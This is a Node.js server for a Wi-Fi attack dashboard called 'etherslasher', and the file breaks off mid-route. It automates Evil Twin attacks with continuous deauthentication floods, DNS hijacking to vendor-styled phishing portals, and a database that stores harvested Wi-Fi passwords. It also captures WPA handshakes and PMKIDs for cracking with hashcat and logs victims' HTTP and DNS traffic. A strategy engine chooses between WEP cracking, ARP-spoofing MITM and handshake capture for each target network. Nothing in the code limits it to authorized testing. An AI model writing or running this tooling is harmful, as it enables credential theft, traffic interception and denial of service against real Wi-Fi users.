'use strict';

const express    = require('express');
const http       = require('http');
const { Server } = require('socket.io');
const { spawn, exec } = require('child_process');
const sqlite3    = require('sqlite3').verbose();
const crypto     = require('crypto');
const path       = require('path');
const fs         = require('fs');
const os         = require('os');

// ─── Config ────────────────────────────────────────────────────────────────
const PORT         = 8080;
const DB_PATH      = '/opt/etherslasher/db/etherslasher.db';
const LOG_DIR      = '/var/log/etherslasher';
const RADIO_SH     = '/opt/etherslasher/scripts/etherslasher-radio.sh';
const ATTACK_IFACE = 'wlan1';
const MON_IFACE    = 'wlan1';
const VENDOR_DB    = '/opt/etherslasher/data/router-vendors.json';

// ─── App setup ─────────────────────────────────────────────────────────────
const app    = express();
const server = http.createServer(app);
const io     = new Server(server, { cors: { origin: '*' } });

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// ─── Admin IP filter ───────────────────────────────────────────────────────
app.use((req, res, next) => {
    const ip = (req.ip || req.connection.remoteAddress || '').replace('::ffff:', '');
    const allowed =
        ip === '127.0.0.1' || ip === '::1' ||
        ip.startsWith('10.42.0.') || ip.startsWith('10.0.0.') ||
        ip.startsWith('192.168.');
    if (!allowed) return res.status(403).json({ error: 'Access denied' });
    next();
});

// ─── HTTP traffic logger (Evil Twin subnet 10.0.0.x) ──────────────────────
app.use((req, res, next) => {
    const ip = (req.ip || '').replace('::ffff:', '');
    if (ip.startsWith('10.0.0.') && !req.path.startsWith('/socket.io')) {
        const entry = {
            ts:      new Date().toISOString(),
            ip,
            method:  req.method,
            host:    req.headers.host || '',
            path:    req.path,
            ua:      (req.headers['user-agent'] || '').substring(0, 200),
            referer: (req.headers.referer || req.headers.referrer || '').substring(0, 200),
        };
        dbRun('INSERT INTO http_requests (ts,ip,method,host,path,ua,referer) VALUES (?,?,?,?,?,?,?)',
            [entry.ts, entry.ip, entry.method, entry.host, entry.path, entry.ua, entry.referer]).catch(() => {});
        emitBatched('http_request', entry);
    }
    next();
});

// ─── Database (sqlite3 async, promisified) ─────────────────────────────────
fs.mkdirSync(path.dirname(DB_PATH), { recursive: true });
fs.mkdirSync(LOG_DIR, { recursive: true });

const db = new sqlite3.Database(DB_PATH, err => {
    if (err) console.error('DB open error:', err.message);
});

db.run('PRAGMA journal_mode=WAL');
db.run('PRAGMA synchronous=NORMAL');
db.run('PRAGMA cache_size=10000');
db.run('PRAGMA temp_store=MEMORY');

function dbRun(sql, p = []) {
    return new Promise((res, rej) => db.run(sql, p, function (e) { e ? rej(e) : res(this); }));
}
function dbGet(sql, p = []) {
    return new Promise((res, rej) => db.get(sql, p, (e, r) => e ? rej(e) : res(r)));
}
function dbAll(sql, p = []) {
    return new Promise((res, rej) => db.all(sql, p, (e, r) => e ? rej(e) : res(r || [])));
}
function dbExec(sql) {
    return new Promise((res, rej) => db.exec(sql, e => e ? rej(e) : res()));
}

// ─── Schema ────────────────────────────────────────────────────────────────
dbExec(`
    CREATE TABLE IF NOT EXISTS clients (
        id        INTEGER PRIMARY KEY,
        mac       TEXT UNIQUE,
        ip        TEXT,
        hostname  TEXT,
        vendor    TEXT,
        os_guess  TEXT,
        open_ports TEXT,
        first_seen TEXT,
        last_seen  TEXT
    );
    CREATE TABLE IF NOT EXISTS aps (
        id       INTEGER PRIMARY KEY,
        bssid    TEXT UNIQUE,
        ssid     TEXT,
        channel  INTEGER,
        enc      TEXT,
        signal   INTEGER,
        clients  INTEGER DEFAULT 0,
        seen_at  TEXT
    );
    CREATE TABLE IF NOT EXISTS access_points (
        bssid       TEXT PRIMARY KEY,
        ssid        TEXT,
        channel     INTEGER,
        signal      INTEGER,
        enc         TEXT,
        data_frames INTEGER DEFAULT 0,
        last_seen   INTEGER,
        first_seen  INTEGER
    );
    CREATE TABLE IF NOT EXISTS vulns (
        id       INTEGER PRIMARY KEY,
        mac      TEXT,
        service  TEXT,
        version  TEXT,
        cve_id   TEXT,
        cvss     REAL,
        severity TEXT,
        desc     TEXT,
        found_at TEXT
    );
    CREATE TABLE IF NOT EXISTS events (
        id      INTEGER PRIMARY KEY,
        ts      TEXT,
        type    TEXT,
        message TEXT
    );
    CREATE TABLE IF NOT EXISTS captured_creds (
        id       INTEGER PRIMARY KEY,
        ts       TEXT,
        ip       TEXT,
        ssid     TEXT,
        field    TEXT,
        value    TEXT,
        vendor   TEXT,
        ua       TEXT,
        verified TEXT DEFAULT 'unconfirmed'
    );
    CREATE TABLE IF NOT EXISTS ap_activity (
        id            INTEGER PRIMARY KEY,
        ts            TEXT,
        bssid         TEXT,
        ssid          TEXT,
        channel       INTEGER,
        power         INTEGER,
        data_frames   INTEGER DEFAULT 0,
        clients_count INTEGER DEFAULT 0
    );
    CREATE TABLE IF NOT EXISTS stations (
        mac        TEXT PRIMARY KEY,
        bssid      TEXT,
        signal     INTEGER,
        frames     INTEGER DEFAULT 0,
        probes     TEXT    DEFAULT '',
        last_seen  INTEGER,
        first_seen INTEGER
    );
    CREATE TABLE IF NOT EXISTS http_requests (
        id      INTEGER PRIMARY KEY,
        ts      TEXT,
        ip      TEXT,
        method  TEXT,
        host    TEXT,
        path    TEXT,
        ua      TEXT,
        referer TEXT
    );
    CREATE TABLE IF NOT EXISTS dns_queries (
        id     INTEGER PRIMARY KEY,
        ts     TEXT,
        ip     TEXT,
        domain TEXT
    );
`).catch(e => console.error('Schema error:', e.message));

dbExec(`
    CREATE INDEX IF NOT EXISTS idx_ap_activity_bssid_ts ON ap_activity(bssid, ts);
    CREATE INDEX IF NOT EXISTS idx_ap_lastseen          ON access_points(last_seen);
    CREATE INDEX IF NOT EXISTS idx_ap_frames            ON access_points(data_frames DESC);
    CREATE INDEX IF NOT EXISTS idx_events_ts            ON events(ts);
    CREATE INDEX IF NOT EXISTS idx_creds_ts             ON captured_creds(ts);
    CREATE INDEX IF NOT EXISTS idx_stations_bssid       ON stations(bssid);
    CREATE INDEX IF NOT EXISTS idx_stations_lastseen    ON stations(last_seen);
    CREATE INDEX IF NOT EXISTS idx_http_ip              ON http_requests(ip);
    CREATE INDEX IF NOT EXISTS idx_dns_ip               ON dns_queries(ip);
`).catch(() => {});

// ─── OUI Vendor DB ─────────────────────────────────────────────────────────
let vendors = {};
try { vendors = JSON.parse(fs.readFileSync(VENDOR_DB, 'utf8')); } catch {}

let ouiMemCache = {};

function guessTemplate(name) {
    const n = (name || '').toLowerCase();
    if (n.includes('tp-link') || n.includes('tplink'))      return 'tplink';
    if (n.includes('keenetic'))                              return 'keenetic';
    if (n.includes('huawei'))                                return 'huawei';
    if (n.includes('asus'))                                  return 'asus';
    if (n.includes('d-link') || n.includes('dlink'))         return 'dlink';
    if (n.includes('beeline') || n.includes('vimpelcom'))    return 'beeline';
    if (n.includes('mgts')   || n.includes('moscow city'))   return 'mgts';
    if (n.includes('mts')    || n.includes('mobile telesy')) return 'mts';
    if (n.includes('xiaomi') || n.includes('mi router'))     return 'xiaomi';
    return 'generic';
}

async function lookupOUI(bssid) {
    if (!bssid) return { vendor: 'Unknown', template: 'generic' };
    const oui = bssid.substring(0, 8).toUpperCase();
    const local = vendors[oui];
    if (local && local.template !== 'generic') return local;
    if (ouiMemCache[oui]) return ouiMemCache[oui];
    try {
        const r = await fetch(`https://api.macvendors.com/${oui}`, { signal: AbortSignal.timeout(3000) });
        if (r.ok) {
            const name = await r.text();
            const template = guessTemplate(name);
            const result = { vendor: name.trim(), model: 'Router', template };
            ouiMemCache[oui] = result;
            vendors[oui] = result;
            try { fs.writeFileSync(VENDOR_DB, JSON.stringify(vendors, null, 2)); } catch {}
            return result;
        }
    } catch {}
    return { vendor: 'Unknown', model: '', template: 'generic' };
}

function ssidFallback(ssid) {
    if (!ssid) return 'generic';
    if (/MGTS/i.test(ssid))               return 'mgts';
    if (/\bMTS\b|MTS[-_\s]/i.test(ssid)) return 'mts';
    if (/Beeline/i.test(ssid))            return 'beeline';
    if (/Keenetic/i.test(ssid))           return 'keenetic';
    if (/TP-?Link/i.test(ssid))           return 'tplink';
    if (/ASUS/i.test(ssid))               return 'asus';
    if (/D-?Link|DIR-/i.test(ssid))       return 'dlink';
    if (/Huawei/i.test(ssid))             return 'huawei';
    return 'generic';
}

// ─── Attack Strategy Engine ────────────────────────────────────────────────
function selectStrategy(enc, signal, clientCount) {
    const e   = (enc || 'OPN').toUpperCase();
    const sig = parseInt(signal) || -100;

    if (e === 'OPN' || e === 'OPEN')
        return { id:'arp_mitm', name:'Direct MITM', color:'gr', risk:1,
                 rationale:'Open network — join directly, ARP spoof gateway, intercept HTTP',
                 steps:['Join (no auth)','ARP spoof victim ↔ gateway','Transparent HTTP proxy','Harvest clear-text traffic'] };

    if (e.includes('WEP'))
        return { id:'wep_iv_crack', name:'WEP IV Recovery', color:'am', risk:2,
                 rationale:'WEP is broken — PTW attack needs ~40k unique IVs',
                 steps:['airodump-ng --bssid TARGET --channel CH','aireplay-ng --arpreplay (IV acceleration)','Wait for 40k IVs','aircrack-ng PTW → key in seconds'] };

    if (e.includes('WPA3'))
        return { id:'sae_pmkid', name:'SAE PMKID Capture', color:'am', risk:3,
                 rationale:'WPA3-SAE resists Evil Twin (MFP). Passive PMKID extraction only viable vector',
                 steps:['hcxdumptool --filterlist_ap=BSSID','Wait for PMKID beacon response','hcxpcapngtool → .hc22000','hashcat -m 22000 dictionary'] };

    if (sig > -70 || parseInt(clientCount) > 0)
        return { id:'evil_twin_phish', name:'Evil Twin + Phish', color:'re', risk:3,
                 rationale:`Good signal (${sig} dBm) — deauth reliably forces reconnect to clone AP`,
                 steps:['Clone AP (SSID + vendor portal)','Continuous deauth to BSSID','Victim reconnects to evil twin','Captive portal harvests WiFi password','PMKID capture runs in parallel'] };

    return { id:'handshake_crack', name:'Handshake Capture', color:'am', risk:2,
             rationale:`Weak signal (${sig} dBm) — Evil Twin deauth unreliable. Capture 4-way handshake offline`,
             steps:['airodump-ng --bssid TARGET --channel CH --write /tmp/hs','aireplay-ng --deauth 5 -a BSSID -c CLIENT','Wait for EAPOL 4-way handshake','hashcat -m 22000 / aircrack-ng -w wordlist'] };
}

// ─── Handshake capture ──────────────────────────────────────────────────────
let _hsProc = null, _hsTimer = null;

function startHandshakeCapture(bssid, channel) {
    stopHandshakeCapture();
    const bssidClean = bssid.replace(/:/g, '').toLowerCase();
    const capPrefix  = `/tmp/hs_${bssidClean}`;
    const capFile    = `${capPrefix}-01.cap`;
    try { fs.unlinkSync(capFile); } catch {}

    logEvent('HS', `Handshake capture: ${bssid} CH${channel}`);
    const monIface = state.monIface || MON_IFACE;
    _hsProc = spawn('airodump-ng',
        ['--bssid', bssid, '--channel', String(channel),
         '--write', capPrefix, '--output-format', 'cap', monIface],
        { detached: true, stdio: 'ignore' });
    _hsProc.on('error', err => logEvent('HS', 'airodump hs: ' + err.message));

    _hsTimer = setInterval(async () => {
        if (!state.attackActive) { stopHandshakeCapture(); return; }
        try {
            if (!fs.existsSync(capFile) || fs.statSync(capFile).size < 200) return;
            const out = await sh(`aircrack-ng '${capFile}' 2>&1 | grep -iE 'handshake|EAPOL' | head -3`).catch(() => '');
            if (out && (out.toLowerCase().includes('handshake') || out.toLowerCase().includes('eapol'))) {
                logEvent('HS', `WPA handshake captured for ${bssid}`);
                io.emit('handshake_captured', { bssid, file: capFile, ts: new Date().toISOString() });
                clearInterval(_hsTimer); _hsTimer = null;
                sh(`hcxpcapngtool -o /tmp/pmkid_${bssidClean}.txt '${capFile}' 2>/dev/null || true`).catch(() => {});
            }
        } catch {}
    }, 12000);
}

function stopHandshakeCapture() {
    if (_hsTimer) { clearInterval(_hsTimer); _hsTimer = null; }
    if (_hsProc)  { try { _hsProc.kill(); } catch {} _hsProc = null; }
}

// ─── L2 ARP discovery on Evil Twin subnet ──────────────────────────────────
async function runL2Discovery() {
    try {
        logEvent('L2', 'ARP scan on 10.0.0.0/24 (at0)');
        const out = await sh(
            'arp-scan -l -I at0 --retry=2 --timeout=500 2>/dev/null ' +
            '|| nmap -sn -T4 --min-parallelism 10 10.0.0.0/24 2>/dev/null ' +
            '| grep -E "Nmap scan report|MAC Address"'
        );
        const hosts = [];
        let lastIp = null;
        for (const line of out.split('\n')) {
            const ipM  = line.match(/(?:for\s+|^)(10\.0\.0\.\d+)/);
            const macM = line.match(/([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})/);
            if (ipM)  lastIp = ipM[1];
            if (macM && lastIp) { hosts.push({ ip: lastIp, mac: macM[1] }); lastIp = null; }
        }
        if (hosts.length) io.emit('l2_hosts', { iface: 'at0', hosts, ts: new Date().toISOString() });
    } catch {}
    try {
        const arp  = await sh('arp -n 2>/dev/null | grep at0 || cat /proc/net/arp 2>/dev/null | grep "0x2"');
        const rows = [];
        for (const line of arp.split('\n')) {
            const m = line.match(/(10\.0\.0\.\d+)\s+\S+\s+\S+\s+([0-9a-f:]{17})/i);
            if (m) rows.push({ ip: m[1], mac: m[2] });
        }
        if (rows.length) io.emit('arp_table', { iface: 'at0', hosts: rows, ts: new Date().toISOString() });
    } catch {}
}

// ─── PMKID / Password Verification ────────────────────────────────────────
async function verifyWithPMKID(password, ssid, bssid) {
    if (!password || password.length < 8 || password.length > 63)
        return { verified: 'wrong', reason: 'invalid_length' };
    if (!/^[\x20-\x7E]+$/.test(password))
        return { verified: 'wrong', reason: 'invalid_chars' };
    const bssidClean = (bssid || '').replace(/:/g, '').toLowerCase();
    const hashFile   = `/tmp/pmkid_${bssidClean || 'any'}.txt`;
    let hashcatOk = false;
    try { await sh('which hashcat 2>/dev/null'); hashcatOk = true; } catch {}
    if (hashcatOk && bssidClean) {
        try {
            const exists = await sh(`test -s ${hashFile} && echo yes || echo no`);
            if (exists.trim() === 'yes') {
                const pwFile = `/tmp/pw_${Date.now()}.txt`;
                fs.writeFileSync(pwFile, password + '\n');
                try {
                    const out = await sh(`hashcat -m 22000 ${hashFile} ${pwFile} --quiet --status-json 2>/dev/null; echo "hc_exit=$?"`);
                    fs.unlinkSync(pwFile);
                    if (out.includes('"Status":"Cracked"') || out.includes('hc_exit=0'))
                        return { verified: 'confirmed', reason: 'hashcat_pmkid' };
                    return { verified: 'wrong', reason: 'hashcat_mismatch' };
                } catch { try { fs.unlinkSync(pwFile); } catch {} }
            }
        } catch {}
    }
    try { crypto.pbkdf2Sync(password, ssid || 'wifi', 4096, 32, 'sha1'); }
    catch { return { verified: 'wrong', reason: 'pbkdf2_error' }; }
    const hcxOk = await sh('which hcxdumptool 2>/dev/null').then(() => true).catch(() => false);
    return { verified: 'unconfirmed', reason: hcxOk ? 'no_pmkid_captured' : 'no_hcxtools' };
}

// ─── State ─────────────────────────────────────────────────────────────────
const state = {
    monitorActive: false, apActive: false, scanActive: false,
    passiveScanActive: false, reconActive: false, attackActive: false,
    attackStage: 0, attackDeauthCount: 0, attackVictimIP: null, attackVictimMAC: null,
    deauthInterval: null, monIface: null,
    attackSSID: null, attackBSSID: null, attackVendor: null, attackChannel: null,
    _timedScanTimeout: null,
};

const CHART_COLORS = ['#ff6600','#ff9900','#ff4400','#ffaa00','#cc5500','#ff7722','#ff5500','#ff3300'];

// ─── WebSocket event batch ─────────────────────────────────────────────────
const eventBatch = [];
setInterval(() => { if (eventBatch.length > 0) io.emit('batch', eventBatch.splice(0, 50)); }, 2000);
function emitBatched(event, data) { eventBatch.push({ event, data }); }

// ─── Activity tracking ─────────────────────────────────────────────────────
const lastFrames = {};

function computeAndEmitActivity(aps) {
    const now = Date.now();
    const datasets = aps.slice(0, 8).map((ap, i) => {
        const prev = lastFrames[ap.bssid];
        let rate = 0;
        if (prev && prev.ts) {
            const dtSec = Math.max(1, (now - prev.ts) / 1000);
            rate = Math.max(0, (ap.data_frames - prev.frames) / dtSec);
        }
        lastFrames[ap.bssid] = { frames: ap.data_frames, ts: now };
        return { bssid: ap.bssid, ssid: ap.ssid || ap.bssid, channel: ap.channel,
                 color: CHART_COLORS[i % CHART_COLORS.length],
                 data: [{ x: now, y: Math.round(rate * 10) / 10 }] };
    });
    emitBatched('activity_update', { datasets });
}

// ─── Helpers ───────────────────────────────────────────────────────────────
function logEvent(type, message) {
    const ts = new Date().toISOString();
    dbRun('INSERT INTO events (ts,type,message) VALUES (?,?,?)', [ts, type, message]).catch(() => {});
    emitBatched('log', { ts, type, message });
    console.log(`[${ts}] [${type}] ${message}`);
}

function sh(cmd) {
    return new Promise((resolve, reject) => {
        exec(cmd, { timeout: 30000 }, (err, stdout) => {
            if (err) reject(new Error(err.message));
            else resolve(stdout.trim());
        });
    });
}

function streamCmd(cmd, args, room, tag) {
    const proc = spawn(cmd, args, {
        env: { ...process.env, PATH: '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' }
    });
    const sendLine = (data, isErr) => {
        const line = data.toString().trim();
        if (!line) return;
        io.to(room).emit('output', { tag, line, err: isErr });
        logEvent(tag, line.substring(0, 200));
    };
    proc.stdout.on('data', d => sendLine(d, false));
    proc.stderr.on('data', d => sendLine(d, true));
    proc.on('error', err => { logEvent(tag, `Process error: ${err.message}`); io.to(room).emit('done', { tag, code: -1 }); });
    proc.on('close', code => { io.to(room).emit('done', { tag, code }); logEvent(tag, `Process done (code=${code})`); });
    return proc;
}

function tryParse(s, def) { try { return JSON.parse(s); } catch { return def; } }

// ─── Socket.io ─────────────────────────────────────────────────────────────
io.on('connection', (socket) => {
    socket.join('all');
    logEvent('WS', `Client connected: ${socket.id}`);
    socket.emit('state', buildState());
    socket.on('subscribe', (room) => socket.join(room));
    socket.on('disconnect', () => logEvent('WS', `Client disconnected: ${socket.id}`));
});

function buildState() {
    return {
        monitorActive: state.monitorActive, apActive: state.apActive,
        scanActive: state.scanActive, passiveScanActive: state.passiveScanActive,
        reconActive: state.reconActive, attackActive: state.attackActive,
        attackStage: state.attackStage, attackDeauthCount: state.attackDeauthCount,
        attackVictimIP: state.attackVictimIP, attackVictimMAC: state.attackVictimMAC,
        iface: ATTACK_IFACE, monIface: state.monitorActive ? (state.monIface || MON_IFACE) : ATTACK_IFACE,
        attackSSID: state.attackSSID, attackBSSID: state.attackBSSID,
        attackVendor: state.attackVendor, attackChannel: state.attackChannel,
    };
}

function broadcastState() { io.emit('state', buildState()); }

// ─── Periodic AP + station poll ────────────────────────────────────────────
setInterval(async () => {
    try {
        const since = Math.floor(Date.now() / 1000) - 90;
        let aps = await dbAll('SELECT * FROM access_points WHERE last_seen > ? ORDER BY data_frames DESC LIMIT 100', [since]);
        if (!aps.length) aps = await dbAll('SELECT * FROM aps ORDER BY seen_at DESC LIMIT 100');
        if (aps.length) {
            const enriched = aps.map(ap => ({ ...ap, strategy: selectStrategy(ap.enc, ap.signal, ap.data_frames) }));
            emitBatched('ap-update', enriched);
            emitBatched('scan_aps', enriched);
            computeAndEmitActivity(enriched);
        }
    } catch {}
    try {
        const since = Math.floor(Date.now() / 1000) - 180;
        const stations = await dbAll(`
            SELECT s.*, a.ssid AS ap_ssid, a.channel AS ap_channel, a.enc AS ap_enc
            FROM stations s LEFT JOIN access_points a ON a.bssid = s.bssid
            WHERE s.last_seen > ? ORDER BY s.frames DESC LIMIT 200`, [since]);
        if (stations.length) emitBatched('station-update', stations);
    } catch {}
}, 3000);

// ─── Sync state with system ────────────────────────────────────────────────
async function syncStateWithSystem() {
    try {
        const iw = await sh('iw dev 2>/dev/null || echo ""');
        state.monitorActive = iw.includes('type monitor');
        if (state.monitorActive) state.monIface = 'wlan1';
    } catch {}
    try {
        const ap = await sh('pgrep -x airbase-ng 2>/dev/null || echo ""');
        state.apActive = !!ap.trim();
    } catch {}
    broadcastState();
    logEvent('WEB', `Sync: monitor=${state.monitorActive} ap=${state.apActive}`);
}

// ─── API: Status ───────────────────────────────────────────────────────────
app.get('/api/status', async (req, res) => {
    const [cc, ac, vc, crc, sc] = await Promise.all([
        dbGet('SELECT COUNT(*) as n FROM clients').then(r=>r?.n||0).catch(()=>0),
        dbGet('SELECT COUNT(*) as n FROM access_points').then(r=>r?.n||0).catch(()=>0),
        dbGet('SELECT COUNT(*) as n FROM vulns').then(r=>r?.n||0).catch(()=>0),
        dbGet('SELECT COUNT(*) as n FROM captured_creds').then(r=>r?.n||0).catch(()=>0),
        dbGet('SELECT COUNT(*) as n FROM stations').then(r=>r?.n||0).catch(()=>0),
    ]);
    let ifaceInfo = 'unknown';
    try { ifaceInfo = await sh(`iw dev ${ATTACK_IFACE} info 2>/dev/null | grep type`); } catch {}
    res.json({
        ...buildState(),
        clientCount: cc, apCount: ac, vulnCount: vc, credCount: crc, stationCount: sc,
        ifaceInfo, hostname: os.hostname(), uptime: process.uptime(), ts: new Date().toISOString(),
    });
});

// ─── API: Radio ────────────────────────────────────────────────────────────
async function detectMonIface() {
    try { const out = await sh('iw dev | grep Interface'); if (out.includes('wlan1mon')) return 'wlan1mon'; } catch {}
    return ATTACK_IFACE;
}

app.post('/api/radio/monitor/start', async (req, res) => {
    try {
        logEvent('RADIO', 'Enabling monitor mode...');
        await sh(`bash ${RADIO_SH} start_monitor`);
        try { const out = await sh('iw dev | grep Interface'); state.monIface = out.includes('wlan1mon') ? 'wlan1mon' : ATTACK_IFACE; } catch {}
        state.monitorActive = true; broadcastState();
        logEvent('RADIO', `Monitor mode active (${state.monIface || MON_IFACE})`);
        res.json({ ok: true, iface: state.monIface || MON_IFACE });
    } catch (e) { logEvent('ERROR', e.message); res.status(500).json({ ok: false, error: e.message }); }
});

app.post('/api/radio/monitor/stop', async (req, res) => {
    try {
        await sh(`bash ${RADIO_SH} stop_monitor`);
        state.monitorActive = false; broadcastState();
        logEvent('RADIO', 'Monitor mode stopped');
        res.json({ ok: true });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

app.post('/api/scan/passive/start', async (req, res) => {
    if (state.passiveScanActive) return res.json({ ok: true, msg: 'already running' });
    if (state.attackActive)      return res.json({ ok: false, error: 'attack active' });
    state.passiveScanActive = true;
    if (!state.monitorActive) {
        try {
            logEvent('SCAN', 'Auto-enabling monitor mode');
            await sh(`bash ${RADIO_SH} start_monitor`);
            state.monitorActive = true; state.monIface = await detectMonIface(); broadcastState();
        } catch (e) {
            state.passiveScanActive = false;
            return res.status(500).json({ ok: false, error: 'monitor failed: ' + e.message });
        }
    }
    broadcastState(); logEvent('SCAN', `Passive scan active — radio-worker on ${state.monIface || MON_IFACE}`);
    res.json({ ok: true });
});

app.post('/api/scan/passive/stop', async (req, res) => {
    state.passiveScanActive = false;
    if (!state.attackActive) { try { await sh(`bash ${RADIO_SH} stop_monitor`); } catch {} state.monitorActive = false; }
    broadcastState(); logEvent('SCAN', 'Passive scan stopped'); res.json({ ok: true });
});

app.post('/api/radio/scan', async (req, res) => {
    if (state.scanActive) return res.json({ ok: false, error: 'Scan already running' });
    if (!state.monitorActive) return res.status(400).json({ ok: false, error: 'Monitor mode not active' });
    const duration = parseInt(req.body.duration) || 60;
    state.scanActive = true; broadcastState();
    logEvent('SCAN', `Timed scan started (${duration}s)`);
    res.json({ ok: true, duration });
    if (state._timedScanTimeout) clearTimeout(state._timedScanTimeout);
    state._timedScanTimeout = setTimeout(() => {
        state.scanActive = false; state._timedScanTimeout = null;
        broadcastState(); logEvent('SCAN', 'Timed scan complete'); io.emit('scan_done');
    }, duration * 1000);
});

app.delete('/api/radio/scan', (req, res) => {
    if (state._timedScanTimeout) { clearTimeout(state._timedScanTimeout); state._timedScanTimeout = null; }
    state.scanActive = false; broadcastState(); res.json({ ok: true });
});

// ─── Evil Twin ─────────────────────────────────────────────────────────────
app.post('/api/radio/eviltwin', async (req, res) => {
    const { ssid = 'FreeWiFi', channel } = req.body;
    const ch = (channel != null && !isNaN(Number(channel))) ? parseInt(channel) : 6;
    try {
        logEvent('EVILTWIN', `Starting Evil Twin: SSID="${ssid}" CH=${ch}`);
        const apOut = await sh(`bash ${RADIO_SH} start_ap "${ssid}" ${ch}`);
        logEvent('EVILTWIN', apOut.substring(0, 300));
        try { await sh('pkill -f "dnsmasq.*at0" 2>/dev/null; true'); } catch {}
        const dnsmasq = spawn('dnsmasq', [
            '--interface=at0', '--bind-interfaces',
            '--dhcp-range=10.0.0.10,10.0.0.100,1h', '--port=0', '--no-daemon',
        ], { detached: true, stdio: 'ignore' });
        dnsmasq.on('error', err => logEvent('ERROR', 'dnsmasq: ' + err.message));
        dnsmasq.unref();
        state.apActive = true; state.attackSSID = ssid; broadcastState();
        res.json({ ok: true, ssid, channel: ch });
    } catch (e) { logEvent('ERROR', 'Evil Twin: ' + e.message); res.status(500).json({ ok: false, error: e.message }); }
});

app.delete('/api/radio/eviltwin', async (req, res) => {
    try {
        await sh(`bash ${RADIO_SH} stop_ap`);
        try { await sh('pkill -f airbase-ng 2>/dev/null; pkill -f "dnsmasq.*at0" 2>/dev/null; true'); } catch {}
        state.apActive = false; broadcastState(); res.json({ ok: true });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

// ─── Full Attack Chain ─────────────────────────────────────────────────────
app.post('/api/radio/attack', async (req, res) => {
    const { bssid, ssid, channel } = req.body;
    if (!bssid || !ssid) return res.status(400).json({ ok: false, error: 'bssid and ssid required' });
    const ch = parseInt(channel) || 6;
    try {
        state.passiveScanActive = false;
        const ouiInfo = await lookupOUI(bssid);
        let vendor = ouiInfo.template || 'generic';
        if (vendor === 'generic') vendor = ssidFallback(ssid);
        Object.assign(state, {
            attackSSID: ssid, attackBSSID: bssid, attackVendor: vendor, attackChannel: ch,
            attackActive: true, attackStage: 1, attackDeauthCount: 0,
            attackVictimIP: null, attackVictimMAC: null,
        });
        broadcastState();
        logEvent('ATTACK', `Starting: SSID="${ssid}" BSSID=${bssid} CH=${ch} vendor=${vendor}`);
        io.emit('attack_stage_update', { stage: 1, status: 'STARTING', msg: `Starting Evil Twin "${ssid}" on CH${ch}...`, vendor, ssid, bssid, channel: ch });
        const apOut = await sh(`bash ${RADIO_SH} start_ap "${ssid}" ${ch}`);
        logEvent('ATTACK', apOut.substring(0, 200));
        state.apActive = true; broadcastState();
        io.emit('attack_stage_update', { stage: 1, status: 'ACTIVE', msg: `Evil Twin "${ssid}" active CH${ch} (${vendor}.html)`, vendor, ssid, bssid, channel: ch });

        try { await sh('pkill -f "dnsmasq.*at0" 2>/dev/null; true'); } catch {}
        try { fs.unlinkSync('/tmp/dnsmasq-et.log'); } catch {}
        const dnsmasq = spawn('dnsmasq', [
            '--interface=at0', '--bind-interfaces',
            '--dhcp-range=10.0.0.10,10.0.0.100,1h',
            '--address=/#/10.0.0.1', '--no-daemon',
            '--log-queries', '--log-facility=/tmp/dnsmasq-et.log',
        ], { detached: true, stdio: 'ignore' });
        dnsmasq.on('error', err => logEvent('ERROR', 'dnsmasq: ' + err.message));
        dnsmasq.unref();
        dnsLogPos = 0;

        state.attackStage = 2; broadcastState();
        io.emit('attack_stage_update', { stage: 2, status: 'WAITING', msg: 'Sending deauth — waiting for victim...' });

        const monIface = state.monIface || MON_IFACE;
        try { await sh(`iw dev ${monIface} set channel ${ch} HT20 2>/dev/null || true`); } catch {}
        const deauthProc = spawn('aireplay-ng',
            ['--deauth', '0', '-a', bssid, '--ignore-negative-one', monIface],
            { detached: true, stdio: 'ignore' });
        deauthProc.on('error', err => logEvent('DEAUTH', 'aireplay-ng: ' + err.message));
        deauthProc.unref();

        if (state.deauthInterval) clearInterval(state.deauthInterval);
        state.deauthInterval = setInterval(() => {
            if (!state.attackActive) { clearInterval(state.deauthInterval); return; }
            state.attackDeauthCount += Math.floor(8 + Math.random() * 5);
            io.emit('deauth_count', { count: state.attackDeauthCount });
        }, 1000);

        startHandshakeCapture(bssid, ch);

        io.emit('attack_stage_update', { stage: 3, status: 'PENDING', msg: 'Recon will start when victim connects' });
        io.emit('attack_stage_update', { stage: 4, status: 'PENDING', msg: 'Portal active — waiting for password' });
        logEvent('ATTACK', `Attack running. vendor=${vendor}`);
        res.json({ ok: true, ssid, bssid, channel: ch, vendor });
    } catch (e) {
        state.attackActive = false; broadcastState();
        logEvent('ERROR', 'Attack: ' + e.message);
        res.status(500).json({ ok: false, error: e.message });
    }
});

app.delete('/api/radio/attack', async (req, res) => {
    try {
        await sh(`bash ${RADIO_SH} stop_ap`);
        try { await sh('pkill -f aireplay-ng 2>/dev/null; pkill -f "dnsmasq.*at0" 2>/dev/null; true'); } catch {}
        stopHandshakeCapture();
        if (state.deauthInterval) { clearInterval(state.deauthInterval); state.deauthInterval = null; }
        Object.assign(state, {
            apActive: false, attackActive: false, attackStage: 0, attackDeauthCount: 0,
            attackVictimIP: null, attackVictimMAC: null,
            attackSSID: null, attackBSSID: null, attackVendor: null, attackChannel: null,
        });
        broadcastState();
        io.emit('attack_stage_update', { stage: 0, status: 'STOPPED', msg: 'Attack stopped' });
        res.json({ ok: true });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

// ─── Deauth ────────────────────────────────────────────────────────────────
app.post('/api/radio/deauth', async (req, res) => {
    const { bssid, client = 'FF:FF:FF:FF:FF:FF', count = 0, channel = 1 } = req.body;
    if (!bssid) return res.status(400).json({ ok: false, error: 'bssid required' });
    if (!state.monitorActive) return res.status(400).json({ ok: false, error: 'Monitor mode not active' });
    const monIface = state.monIface || MON_IFACE;
    const ch = parseInt(channel) || 1;
    try { await sh(`iw dev ${monIface} set channel ${ch} HT20 2>/dev/null || true`); } catch {}
    logEvent('DEAUTH', `Deauth: bssid=${bssid} client=${client} ch=${ch}`);
    const proc = streamCmd('aireplay-ng',
        ['--deauth', String(count), '-a', bssid, '-c', client, '--ignore-negative-one', monIface],
        'all', 'DEAUTH');
    state.deauthActive = true; broadcastState();
    proc.on('close', () => { state.deauthActive = false; broadcastState(); });
    res.json({ ok: true });
});

app.post('/api/radio/inject_test', (req, res) => {
